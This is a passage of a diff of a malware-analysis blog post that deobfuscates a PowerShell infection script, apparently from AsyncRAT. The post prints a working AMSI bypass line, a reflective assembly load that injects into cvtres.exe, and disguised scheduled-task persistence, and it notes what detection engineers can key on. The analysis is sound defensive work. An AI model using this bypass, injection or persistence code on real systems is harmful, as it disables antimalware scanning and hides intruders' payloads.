+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">S`eT-It`em ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + (&#39;blE:1&#39;+&#39;q2&#39;) + (&#39;uZ&#39;+&#39;x&#39;) ) ([TYpE]( &#34;{1}{0}&#34;-F&#39;F&#39;,&#39;rE&#39; ) ) ;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This may look weird, but it&rsquo;s rather simplistic in its obfuscation. First, it uses backtick marks (`) between letters; these backticks are ignored by the interpreter when executed, which effectively means that <code>S`eT-It`em</code> simply means <code>Set-Item</code>. The rest of the first part of this string is simply character concatenation, which resolves to <code>Variable:1q2uZx</code>. Finally, the third type of obfuscation used in this block is basic string formatting. This simply means that the string is put together based on an array of values. In this case, we have <code>{1}{0}</code>, which means that the second item in the array ({1}) is immediately followed by the first item in the array ({0}). The array starts after the <code>-F</code> flag, meaning <code>F</code> is the first item and <code>rE</code> is the second item. This, in turns, will format together into <code>[TYpE]reF</code>. This is a special type of variable that is known as a <code>reference type</code>; that is, rather than it being a variable holding a value, it is a variable holding a reference. The <code>[ref]</code> variable is a special pointer to the class <code>System.Management.Automation.PSReference</code>.</p>
 <p>All in all, the full deobfuscated string for this code block will look like the following:</p>
 <p><code>Set-Item variable:1q2uZx System.Management.Automation.PSReference</code></p>
 <p>This is simply creating a <code>PSReference</code> object into a session-specific variable named <code>1q2uZx</code>.</p>
 <h3 id="third-section---step-2---variable-reference">Third Section - Step 2 - Variable Reference</h3>
 <p>The second set of code in the block is:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">(</span><span class="w"> </span><span class="n">Get</span><span class="o">-</span><span class="n">varI</span><span class="o">`</span><span class="n">A</span><span class="o">`</span><span class="nf">BLE</span><span class="w"> </span><span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="o">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="n">VaL</span><span class="w"> </span><span class="p">).</span><span class="s2">&#34;A`ss`Embly&#34;</span><span class="p">.</span><span class="s2">&#34;GET`TY`Pe&#34;</span></span></span></code></pre></div></div>
-<p>The first part of this is simply getting the value of the variable <code>1q2uZx</code> that was created in the previous command. This variable is simply a reference to the <code>System.Management.Automation</code> namespace within the .NET framework. For those unaware, this namespace is effectively the .NET runtime used for PowerShell. All things PowerShell, from running commands, accessing the file system, managing processes, etc, execute within this namespace.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">(</span><span class="w"> </span><span class="n">Get</span><span class="o">-</span><span class="n">varI</span><span class="o">`</span><span class="n">A</span><span class="o">`</span><span class="nf">BLE</span><span class="w"> </span><span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="o">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="n">VaL</span><span class="w"> </span><span class="p">).</span><span class="s2">&#34;A`ss`Embly&#34;</span><span class="p">.</span><span class="s2">&#34;GET`TY`Pe&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first part of this is simply getting the value of the variable <code>1q2uZx</code> that was created in the previous command. This variable is simply a reference to the <code>System.Management.Automation</code> namespace within the .NET framework. For those unaware, this namespace is effectively the .NET runtime used for PowerShell. All things PowerShell, from running commands, accessing the file system, managing processes, etc, execute within this namespace.</p>
 <p>For this command, it is accessing the assemblies found within this namespace, due to the <code>.Assembly</code> part of the command. It is also looking for a specific one, as it specifies <code>GetType</code> (what it is looking for will be covered in the next section).</p>
 <p>So all in all, this part of the code is simply accessing a specific class, and looks like the following after deobfuscation:</p>
 <p><code>[ref].Assembly.GetType</code></p>
 <h3 id="third-section---step-3---string-concatenation">Third Section - Step 3 - String Concatenation</h3>
 <p>To determine which class the above command is looking for, we have to do some more string formatting deobfuscation. The code can be seen below:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;{6}{3}{1}{4}{2}{0}{5}&#34; -f(&#39;Uti&#39;+&#39;l&#39;),&#39;A&#39;,(&#39;Am&#39;+&#39;si&#39;),(&#39;.Man&#39;+&#39;age&#39;+&#39;men&#39;+&#39;t.&#39;),(&#39;u&#39;+&#39;to&#39;+&#39;mation.&#39;),&#39;s&#39;,(&#39;Syst&#39;+&#39;em&#39;)</span></span></code></pre></div></div>
-<p>Following through the logic mentioned above about how to deobfuscate this, we get the following string:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;{6}{3}{1}{4}{2}{0}{5}&#34; -f(&#39;Uti&#39;+&#39;l&#39;),&#39;A&#39;,(&#39;Am&#39;+&#39;si&#39;),(&#39;.Man&#39;+&#39;age&#39;+&#39;men&#39;+&#39;t.&#39;),(&#39;u&#39;+&#39;to&#39;+&#39;mation.&#39;),&#39;s&#39;,(&#39;Syst&#39;+&#39;em&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Following through the logic mentioned above about how to deobfuscate this, we get the following string:</p>
 <p><code>System.Management.Automation.AmsiUtils</code></p>
 <p>By now, you may have guessed exactly what this whole block of code is doing, but for now, let&rsquo;s continue piecing it together. So far, our full line of code looks like the following:</p>
 <p><code>[ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;)</code></p>
 <h3 id="third-section---step-4---more-string-concatenation">Third Section - Step 4 - More String Concatenation</h3>
 <p>The next block of code is the following:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">.</span><span class="s2">&#34;g`etf`iElD&#34;</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">&#34;{0}{2}{1}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="o">+</span><span class="s1">&#39;nitF&#39;</span><span class="o">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">&#34;{2}{4}{0}{1}{3}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="o">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="o">+</span><span class="s1">&#39;Publ&#39;</span><span class="o">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="p">))</span></span></span></code></pre></div></div>
-<p>More basic string formatting. Though this time, we can see that there are two sections to it; the first section uses the code <code>{0}{2}{1}</code>, while the second section uses <code>{2}{4}{0}{1}{3}</code>. We can also see that they are separated by a comma.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">.</span><span class="s2">&#34;g`etf`iElD&#34;</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">&#34;{0}{2}{1}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="o">+</span><span class="s1">&#39;nitF&#39;</span><span class="o">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">&#34;{2}{4}{0}{1}{3}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="o">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="o">+</span><span class="s1">&#39;Publ&#39;</span><span class="o">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="p">))</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>More basic string formatting. Though this time, we can see that there are two sections to it; the first section uses the code <code>{0}{2}{1}</code>, while the second section uses <code>{2}{4}{0}{1}{3}</code>. We can also see that they are separated by a comma.</p>
 <p>Following through again with our deobfuscation, our first section turns out to be <code>amsiInitFailed</code> and the second section correlates to <code>NonPublic,Static</code>. This makes the full deobfuscated string:</p>
 <p><code>.GetField(&quot;amsiInitFailed&quot;,&quot;NonPublic,Static&quot;)</code></p>
 <p>Since we now have a <code>.GetField</code> command, this means that we are trying to access specific fields within the class mentioned previously and look at or manipulate their values. The full line of code is now thusly:</p>
 <p><code>[ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiInitFailed&quot;,&quot;NonPublic,Static&quot;)</code></p>
 <h3 id="third-section---step-5---final-deobfuscation">Third Section - Step 5 - Final Deobfuscation</h3>
 <p>The final bit of obfuscated code in this section is:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">.</span><span class="s2">&#34;sE`T`VaLUE&#34;</span><span class="p">(</span><span class="w"> </span><span class="err">${</span><span class="n">n</span><span class="o">`</span><span class="n">ULl</span><span class="err">}</span><span class="p">,</span><span class="err">${</span><span class="n">t</span><span class="o">`</span><span class="n">RuE</span><span class="err">}</span><span class="w"> </span><span class="p">)</span></span></span></code></pre></div></div>
-<p>We can tell just from looking at this that the command now is <code>.SetValue</code>, meaning the code will be actively manipulating the fields retrieved in the previous section.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">.</span><span class="s2">&#34;sE`T`VaLUE&#34;</span><span class="p">(</span><span class="w"> </span><span class="err">${</span><span class="n">n</span><span class="o">`</span><span class="n">ULl</span><span class="err">}</span><span class="p">,</span><span class="err">${</span><span class="n">t</span><span class="o">`</span><span class="n">RuE</span><span class="err">}</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can tell just from looking at this that the command now is <code>.SetValue</code>, meaning the code will be actively manipulating the fields retrieved in the previous section.</p>
 <p>The obfuscation in this section is pretty much the same as the previous, with one difference; the addition of the <code>${}</code> characters around the variables. In PowerShell, this is simply another method of declaring a variable that is mostly the same. Declaring variable <code>${test}</code> and <code>$test</code> are the same thing. This means that the variables declared in the above code will equate to <code>$null</code> and <code>$true</code>.</p>
 <p>This makes the whole line of code look like the following:</p>
 <p><code>.SetValue($null,$true)</code></p>
 <h3 id="third-section---final-step---all-together">Third Section - Final Step - All Together</h3>
 <p>All in all, this makes the full obfuscated block of code look like the following:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[ref].Assembly.GetType(&#34;System.Management.Automation.AmsiUtils&#34;).GetField(&#34;amsiInitFailed&#34;,&#34;NonPublic,Static&#34;).SetValue($null,$true)</span></span></code></pre></div></div>
-<p>For those who have not figured it out yet, this line of code is what is known as an AMSI bypass. AMSI (Antimalware Scan Interface) is an interface built in to newer Windows versions that facilitates the integration of applications and services with security products installed on the computer. One of its major features is that it is integrated into the scripting interpreters that are shipped with Windows. This means that it is particularly effective in scanning dynamic script-based malware that may otherwise elude normal security products, particularly if the script performs most or all of its malicious actions in memory.</p>
-<p>There are numerous ways to bypass AMSI, with this being one method. In fact, this exact AMSI bypass was discovered back in 2016 by Matt Graeber as can be seen in a screenshot of a tweet <a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" target="_blank" rel="noopener noreferrer ">here</a>. If an attacker can successfully bypass AMSI, there&rsquo;s a better chance that their malicious script will execute without intervention.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[ref].Assembly.GetType(&#34;System.Management.Automation.AmsiUtils&#34;).GetField(&#34;amsiInitFailed&#34;,&#34;NonPublic,Static&#34;).SetValue($null,$true)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For those who have not figured it out yet, this line of code is what is known as an AMSI bypass. AMSI (Antimalware Scan Interface) is an interface built in to newer Windows versions that facilitates the integration of applications and services with security products installed on the computer. One of its major features is that it is integrated into the scripting interpreters that are shipped with Windows. This means that it is particularly effective in scanning dynamic script-based malware that may otherwise elude normal security products, particularly if the script performs most or all of its malicious actions in memory.</p>
+<p>There are numerous ways to bypass AMSI, with this being one method. In fact, this exact AMSI bypass was discovered back in 2016 by Matt Graeber as can be seen in a screenshot of a tweet <a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" target="_blank" rel="noopener noreffer ">here</a>. If an attacker can successfully bypass AMSI, there&rsquo;s a better chance that their malicious script will execute without intervention.</p>
 <h2 id="fourth-section---binary-blobs">Fourth Section - Binary Blobs</h2>
 <p>After the AMSI bypass, we can see two variables that contain very long byte arrays. We&rsquo;ll dig further into these two blobs in later posts in this series, but for now, let&rsquo;s keep a note of their names: <code>datarun</code> and <code>datanj</code>.</p>
 <h2 id="fifth-section---reflective-dll-injections">Fifth Section - Reflective DLL Injections</h2>
 <p>Now we get to the crux of the script; the actuall reflective DLL injection code:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Reflection.Assembly]::&#39;Load&#39;($datanj).&#39;GetType&#39;(&#39;root.clay&#39;).GetMethod(&#39;Run&#39;).Invoke($null,[object[]] (&#39;C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe&#39;,$datarun))</span></span></code></pre></div></div>
-<p>The <code>[Reflection.Assembly]::'Load'</code> portion of this code is a .NET method. Specifically, it is a .NET method used to load the specified assembly. In this case, the assembly in question being loaded resides within the <code>$datanj</code> binary blog that we saw earlier. This means that the binary blob stored in the <code>$datanj</code> variable is some type of assembly, likely either an EXE or a DLL. In any case, the next portion of the code tells the script where to look within this assembly. It will look for a namespace named <code>root</code> and within that namespace, look for a class named <code>clay</code>. Finally, within this class, it looks for a method named <code>Run</code> to execute. This is where the crux of the code will run from within the assembly.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Reflection.Assembly]::&#39;Load&#39;($datanj).&#39;GetType&#39;(&#39;root.clay&#39;).GetMethod(&#39;Run&#39;).Invoke($null,[object[]] (&#39;C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe&#39;,$datarun))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>[Reflection.Assembly]::'Load'</code> portion of this code is a .NET method. Specifically, it is a .NET method used to load the specified assembly. In this case, the assembly in question being loaded resides within the <code>$datanj</code> binary blog that we saw earlier. This means that the binary blob stored in the <code>$datanj</code> variable is some type of assembly, likely either an EXE or a DLL. In any case, the next portion of the code tells the script where to look within this assembly. It will look for a namespace named <code>root</code> and within that namespace, look for a class named <code>clay</code>. Finally, within this class, it looks for a method named <code>Run</code> to execute. This is where the crux of the code will run from within the assembly.</p>
 <p>We can see the from the <code>.Invoke</code> portion of the command, that the <code>Run</code> method takes some sort of parameters as input. This is recognized by the two variables <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe</code> and <code>$datarun</code>. From just looking at the parameters, we can make some logical assumptions. Firstly, the first input is a legitimate Windows program called <code>cvtres.exe</code>, which is used to &ldquo;convert resource files to COFF objects.&rdquo; This application is used frequently by malware during process hollowing; that is, removing legitimate code within a process with malicious code and re-executing the process. This allows the malware to hide on the system, as the malicious behavior is stemming from a legitimate program, making detection less likely. This first parameter being passed is likely the application chosen by the threat actor to run the malicious program under. Secondly, the second input is the <code>$datarun</code> binary blob from earlier. This is likely the main malicious program that will be injected into the <code>cvtres.exe</code> process when the assembly is done executing. These are simply assumptions based on past experience, but there&rsquo;s a very high likelihood that this is what the assembly in question is configured to do.</p>
 <p>All of these items, from the AMSI bypass in section three to the DLL injection command is then written into a file named <code>C:\Users\Public\svchost.ps1</code>. If you remember, this is the script mentioned in the <code>svchost.bat</code> file that was created earlier in the script.</p>
 <h2 id="sixth-section---main-payload-execution">Sixth Section - Main Payload Execution</h2>
 <p>Once all this setup has been completed, the payloads finally execute with the following command:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Invoke-Item &#34;C:\Users\Public\svchost.vbs&#34;</span></span></code></pre></div></div>
-<p>Let&rsquo;s review the full process chain, now that all the files have been created. If you remember, this <code>svchost.vbs</code> file that is being invoked contain Visual Basic code that simply uses the method <code>WScript.Shell.Run</code> to execute the <code>svchost.bat</code> file. The <code>svchost.bat</code> file, in turn, launches a new PowerShell process that executes the <code>svchost.ps1</code> file. This <code>svchost.ps1</code> file contains the primary malicious code, which will perform the AMSI bypass and then use reflective DLL injection to execute malicious code within a <code>cvtres.exe</code> process.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Invoke-Item &#34;C:\Users\Public\svchost.vbs&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s review the full process chain, now that all the files have been created. If you remember, this <code>svchost.vbs</code> file that is being invoked contain Visual Basic code that simply uses the method <code>WScript.Shell.Run</code> to execute the <code>svchost.bat</code> file. The <code>svchost.bat</code> file, in turn, launches a new PowerShell process that executes the <code>svchost.ps1</code> file. This <code>svchost.ps1</code> file contains the primary malicious code, which will perform the AMSI bypass and then use reflective DLL injection to execute malicious code within a <code>cvtres.exe</code> process.</p>
 <p>This unique process chain makes for a good detection capability for this malware; not to mention, the fact that the files are written to the <code>C:\Users\Public</code> directory and are all named <code>svchost</code> after one of the main Windows processes on any system, there&rsquo;s a lot here that detection engineers and security analysts can key off of to look for this malware executing on an endpoint.</p>
 <h2 id="seventh-section---persistence">Seventh Section - Persistence</h2>
 <p>While the main payload has been executed at this point, the infection script is not quite done yet. Another <code>$Content</code> variable block contains the following code:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">try 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">try 
 </span></span><span class="line"><span class="cl">{
 </span></span><span class="line"><span class="cl">schtasks.exe /create /tn MicrosoftRecovery /sc minute  /st 00:10 /tr C:\Users\Public\svchost.vbs
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">schtasks.exe /create /tn MicrosoftArts /SC minute /MO 3 /tr C:\Users\Public\svchost.vbs
-</span></span><span class="line"><span class="cl">} catch { }</span></span></code></pre></div></div>
-<p>This is where the script establishes persistence for the payload file chain. It creates two scheduled tasks, using the <code>schtasks.exe</code> process, to trigger the main <code>svchost.vbs</code> file at different intervals. The first one named <code>MicrosoftRecovery</code> is configured to run the task at 12:10 AM of the current day and then every one minute afterwards. The second one named <code>MicrosoftArts</code> is configured to run every three minutes.</p>
+</span></span><span class="line"><span class="cl">} catch { }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is where the script establishes persistence for the payload file chain. It creates two scheduled tasks, using the <code>schtasks.exe</code> process, to trigger the main <code>svchost.vbs</code> file at different intervals. The first one named <code>MicrosoftRecovery</code> is configured to run the task at 12:10 AM of the current day and then every one minute afterwards. The second one named <code>MicrosoftArts</code> is configured to run every three minutes.</p>
 <p>It&rsquo;s interesting that two different scheduled tasks, with different names and time configurations, are created to run the same file. This was likely done to add some resilience to the persistence; if one scheduled task is found and deleted, there&rsquo;s the possibility that the second one was missed, allowing the persistence mechanism to&hellip; persist on the device. This was likely done by the threat actor to try to make the infection stick around on the machine for as long as possible.</p>
 <p>Regardless, this block of code is written to a file named <code>C:\Users\Public\inst.ps1</code>. After it is created, it is then executed with the following PowerShell command:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">powershell -windo 1 -noexit -exec bypass -file &#34;C:\Users\Public\inst.ps1&#34;</span></span></code></pre></div></div>
-<h2 id="end-of-part-1">End of Part 1</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">powershell -windo 1 -noexit -exec bypass -file &#34;C:\Users\Public\inst.ps1&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="end-of-part-1">End of Part 1</h2>
 <p>And there we have it! That was a deep dive through the main infection script of this particular piece of malware. In part 2, we&rsquo;ll take a closer look at the binary blob that acts as the reflective DLL injection mechanism, and part 3 will be all about that final payload that is the reason for all of this behavior in the first place. Stay tuned and thanks for reading!!</p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
@@ -282,14 +317,14 @@
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1" data-via="_misthi0s" data-hashtags="malware,.net,powershell,AsyncRAT,dll,reflection"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-hashtag="malware"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" data-title="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024-05-12-powershell-reflective-dll-injection-sample-1%2f&amp;text=Deep%20Analysis%20of%20a%20Powershell-Based%20Reflective%20DLL%20Injection%20Sample%2c%20Part%201" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
